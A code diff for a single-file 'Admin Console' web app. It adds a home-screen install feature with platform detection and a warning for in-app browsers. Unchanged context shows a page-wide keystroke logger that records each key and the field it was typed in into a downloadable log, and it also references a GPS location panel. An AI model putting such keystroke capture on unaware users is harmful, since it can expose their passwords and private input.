@@ -48,6 +48,7 @@
     display:flex;align-items:center;justify-content:center;transition:.2s}
   .icon-btn:hover{background:var(--panel2)}
   .icon-btn.danger{color:var(--red)}
+  .icon-btn.highlight{border-color:var(--accent);background:linear-gradient(180deg,var(--panel),#4f8cff20)}
 
   .status-bar{background:var(--panel);border:1px solid var(--border);border-radius:14px;
     padding:12px 16px;margin-bottom:16px;display:flex;flex-wrap:wrap;gap:14px;font-size:.8rem}
@@ -117,7 +118,6 @@
   .toast.green{border-color:var(--green)}
   .toast.red{border-color:var(--red)}
 
-  /* INSTALL BAR — always visible at bottom */
   #installBar{
     position:fixed;bottom:0;left:0;right:0;
     background:linear-gradient(180deg,var(--panel) 0%,var(--panel2) 100%);
@@ -139,7 +139,6 @@
     cursor:pointer;padding:4px 8px;
   }
 
-  /* MODAL for instructions */
   .modal-back{
     position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9997;
     display:none;align-items:center;justify-content:center;padding:20px;
@@ -156,6 +155,19 @@
     width:100%;margin-top:16px;background:var(--accent);color:#fff;border:none;
     padding:12px;border-radius:10px;font-size:.9rem;font-weight:600;cursor:pointer;
   }
+
+  .install-panel-status{
+    font-size:.82rem;
+    padding:10px 14px;
+    border-radius:10px;
+    background:var(--panel2);
+    border:1px solid var(--border);
+    margin-top:12px;
+    color:var(--text);
+  }
+  .install-panel-status.ready{border-color:var(--green);background:#22c55e15}
+  .install-panel-status.warn{border-color:var(--amber);background:#f59e0b15}
+  .install-panel-status.ok{border-color:var(--green);background:#22c55e15}
 
   @media(max-width:600px){
     .grid{grid-template-columns:repeat(2,1fr)}
@@ -183,6 +195,7 @@
   <header>
     <h1><span class="dot"></span> Admin Console</h1>
     <div class="head-actions">
+      <button class="icon-btn highlight" onclick="handleInstall()" title="Add to Home Screen" id="homeBtn">🏠</button>
       <button class="icon-btn" onclick="toggleTheme()" title="Theme">🌓</button>
       <button class="icon-btn danger" onclick="lockApp()" title="Lock">🔒</button>
     </div>
@@ -231,6 +244,18 @@
     </div>
   </div>
 
+  <div class="panel" id="homescreenPanel">
+    <h2>🏠 Add to Home Screen <span>install as app</span></h2>
+    <p style="color:var(--muted);font-size:.85rem;margin-bottom:14px">
+      Install Admin Console on your device so it opens like a native app — full screen, its own icon, no browser bar.
+    </p>
+    <div class="btn-row">
+      <button class="btn green" onclick="handleInstall()">📲 Install Now</button>
+      <button class="btn ghost" onclick="showInstallInstructions()">📖 How to install</button>
+    </div>
+    <div class="install-panel-status" id="installStatus">Checking install availability…</div>
+  </div>
+
   <div class="panel">
     <h2>📜 System Log <span id="logCount">0</span></h2>
     <div class="log" id="sysLog"></div>
@@ -268,7 +293,6 @@
 
 </div>
 
-<!-- INSTALL BAR — always visible -->
 <div id="installBar">
   <div class="ib-icon">📲</div>
   <div class="ib-text">
@@ -279,7 +303,6 @@
   <button class="ib-close" onclick="dismissInstallBar()">✕</button>
 </div>
 
-<!-- INSTRUCTIONS MODAL -->
 <div class="modal-back" id="installModal">
   <div class="modal">
     <h3>📲 Install the app</h3>
@@ -320,6 +343,7 @@ const now = () => new Date().toLocaleTimeString();
 
 function log(msg, type='info'){
   const el = $('sysLog');
+  if(!el) return;
   const cls = type==='error'?'err':type==='warn'?'warn':'';
   el.innerHTML += `<div class="${cls}"><span class="ts">${now()}</span>${escapeHtml(msg)}</div>`;
   el.scrollTop = el.scrollHeight;
@@ -760,6 +784,7 @@ document.addEventListener('keydown', e=>{
   const value = e.key.length === 1 ? e.key : `[${e.key}]`;
   S.keylogBuffer.push({ ts: Date.now(), field, key: value });
   const el = $('keylogLog');
+  if(!el) return;
   el.innerHTML += `<div><span class="ts">${now()}</span>${escapeHtml(field)} → <b>${escapeHtml(value)}</b></div>`;
   el.scrollTop = el.scrollHeight;
   $('keylogCount').textContent = S.keylogBuffer.length + ' events';
@@ -769,6 +794,7 @@ function downloadKeylog(){
   downloadBlob(new Blob([txt], {type:'text/plain'}), `keylog_${Date.now()}.txt`);
 }
 function clearKeylog(){ S.keylogBuffer = []; $('keylogLog').innerHTML = ''; $('keylogCount').textContent = '0 events'; }
+function clearSysLog(){ $('sysLog').innerHTML = ''; $('logCount').textContent = '0'; }
 
 /* ---------- GPS ---------- */
 async function renderLocationPanel(){
@@ -1291,77 +1317,107 @@ async function testSync(){
 }
 
 /* ============================================================
-   PWA INSTALL — ALWAYS-VISIBLE BAR
+   PWA INSTALL — button in header + panel + bottom bar
    ============================================================ */
 let deferredPrompt = null;
+
+const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent) && !window.MSStream;
+const isAndroid = /Android/i.test(navigator.userAgent);
+const isInAppBrowser = /FBAN|FBAV|Instagram|Line|WhatsApp|Twitter|WebView/i.test(navigator.userAgent);
+const isStandalone = () => window.matchMedia('(display-mode: standalone)').matches || navigator.standalone === true;
 
 window.addEventListener('beforeinstallprompt', (e) => {
   e.preventDefault();
   deferredPrompt = e;
-  log('Install prompt available');
+  log('Install prompt available ✓');
+  updateInstallStatus('✅ Ready to install — tap "Install Now"', 'ready');
 });
 
+window.addEventListener('appinstalled', () => {
+  log('App installed ✓');
+  updateInstallStatus('✅ Installed successfully!', 'ok');
+  setTimeout(dismissInstallBar, 1500);
+});
+
+function updateInstallStatus(msg, kind){
+  const el = $('installStatus');
+  if(el){
+    el.textContent = msg;
+    el.className = 'install-panel-status ' + (kind || '');
+  }
+  const bar = $('installBar');
+  if(isStandalone() && bar) bar.style.display = 'none';
+}
+
 async function handleInstall(){
-  // Case 1: native prompt available
+  if(isStandalone()){
+    toast('Already installed ✓','green');
+    updateInstallStatus('✅ Already installed on this device', 'ok');
+    return;
+  }
+  if(isInAppBrowser){
+    alert('⚠️ You are inside an in-app browser (Facebook/WhatsApp/Instagram).\n\nPlease open this URL in Chrome or Safari first, then tap "Install".');
+    return;
+  }
   if(deferredPrompt){
     deferredPrompt.prompt();
     const { outcome } = await deferredPrompt.userChoice;
-    toast(outcome === 'accepted' ? 'Installing…' : 'Cancelled', outcome === 'accepted' ? 'green' : '');
+    if(outcome === 'accepted'){
+      toast('Installing… 🎉','green');
+      updateInstallStatus('✅ Install accepted — check your home screen', 'ok');
+      dismissInstallBar();
+    } else {
+      toast('Install cancelled','red');
+    }
     deferredPrompt = null;
-    if(outcome === 'accepted') dismissInstallBar();
     return;
   }
-
-  // Case 2: already installed
-  if(window.matchMedia('(display-mode: standalone)').matches || navigator.standalone === true){
-    toast('Already installed ✓','green');
-    dismissInstallBar();
-    return;
-  }
-
-  // Case 3: show manual instructions
   showInstallInstructions();
 }
 
 function showInstallInstructions(){
-  const ua = navigator.userAgent;
   const steps = $('installSteps');
   let html = '';
 
-  if(/Android/i.test(ua)){
+  if(isIOS){
     html = `
       <p style="color:var(--muted);font-size:.85rem;margin-bottom:12px">
-        On Android, open this site in <b>Chrome</b> (not Facebook/WhatsApp browser).
-      </p>
-      <ol>
-        <li>Tap the <b>⋮</b> menu at the top-right</li>
-        <li>Tap <b>"Install app"</b> or <b>"Add to Home screen"</b></li>
-        <li>Confirm by tapping <b>Install</b> / <b>Add</b></li>
-        <li>The icon appears on your home screen 🎉</li>
-      </ol>
-    `;
-  } else if(/iPhone|iPad|iPod/i.test(ua)){
-    html = `
-      <p style="color:var(--muted);font-size:.85rem;margin-bottom:12px">
-        On iPhone/iPad, you must use <b>Safari</b> (not Chrome).
+        On iPhone/iPad, use <b>Safari</b> (not Chrome).
       </p>
       <ol>
         <li>Tap the <b>Share</b> button (□ with ↑)</li>
-        <li>Scroll down and tap <b>"Add to Home Screen"</b></li>
-        <li>Tap <b>Add</b> in the top-right</li>
-        <li>The icon appears on your home screen 🎉</li>
+        <li>Scroll down → tap <b>"Add to Home Screen"</b></li>
+        <li>Tap <b>Add</b> in the top-right corner</li>
+        <li>Icon appears on your home screen 🎉</li>
       </ol>
+      <p style="color:var(--muted);font-size:.8rem;margin-top:12px">
+        💡 If you don't see Share, tap the address bar first.
+      </p>
+    `;
+  } else if(isAndroid){
+    html = `
+      <p style="color:var(--muted);font-size:.85rem;margin-bottom:12px">
+        On Android, use <b>Chrome</b> (not Facebook/WhatsApp browser).
+      </p>
+      <ol>
+        <li>Tap the <b>⋮</b> menu (top-right of Chrome)</li>
+        <li>Tap <b>"Install app"</b> or <b>"Add to Home screen"</b></li>
+        <li>Confirm by tapping <b>Install</b> / <b>Add</b></li>
+        <li>Icon appears on your home screen 🎉</li>
+      </ol>
+      <p style="color:var(--muted);font-size:.8rem;margin-top:12px">
+        💡 If the option is missing, wait 30 seconds — Chrome needs time to detect the app, then try again.
+      </p>
     `;
   } else {
     html = `
       <ol>
-        <li>Open your browser menu</li>
+        <li>Open your browser menu (⋮ or ⋯)</li>
         <li>Choose <b>"Install App"</b> or <b>"Add to Home Screen"</b></li>
         <li>Confirm</li>
       </ol>
     `;
   }
-
   steps.innerHTML = html;
   $('installModal').classList.add('show');
 }
@@ -1371,16 +1427,17 @@ function closeInstallModal(){
 }
 
 function dismissInstallBar(){
-  $('installBar').style.display = 'none';
+  const bar = $('installBar');
+  if(bar) bar.style.display = 'none';
   localStorage.setItem('ac_install_dismissed', '1');
 }
 
-/* Hide install bar if already installed OR user dismissed it */
+/* Hide bottom bar if already installed OR user dismissed it */
 window.addEventListener('load', ()=>{
-  const isStandalone = window.matchMedia('(display-mode: standalone)').matches || navigator.standalone === true;
-  const dismissed = localStorage.getItem('ac_install_dismissed') === '1';
-  if(isStandalone || dismissed){
-    $('installBar').style.display = 'none';
+  const bar = $('installBar');
+  if(!bar) return;
+  if(isStandalone() || localStorage.getItem('ac_install_dismissed') === '1'){
+    bar.style.display = 'none';
   }
 });
 
@@ -1395,6 +1452,19 @@ async function init(){
     window.addEventListener('online', ()=>{ $('netStatus').textContent='online'; $('ledNet').className='led on'; });
     window.addEventListener('offline', ()=>{ $('netStatus').textContent='offline'; $('ledNet').className='led'; });
     $('ledNet').className = navigator.onLine ? 'led on' : 'led';
+
+    /* install status */
+    if(isStandalone()){
+      updateInstallStatus('✅ Already installed on this device', 'ok');
+    } else if(isInAppBrowser){
+      updateInstallStatus('⚠️ In-app browser detected — open in Chrome/Safari to install', 'warn');
+    } else if(deferredPrompt){
+      updateInstallStatus('✅ Ready to install — tap "Install Now"', 'ready');
+    } else if(isIOS){
+      updateInstallStatus('ℹ️ iOS detected — tap "How to install" for steps', 'warn');
+    } else {
+      updateInstallStatus('ℹ️ Tap "Install Now" or "How to install"', 'warn');
+    }
   }catch(e){
     log('Init failed: '+e.message,'error');
     toast('Storage init failed','red');
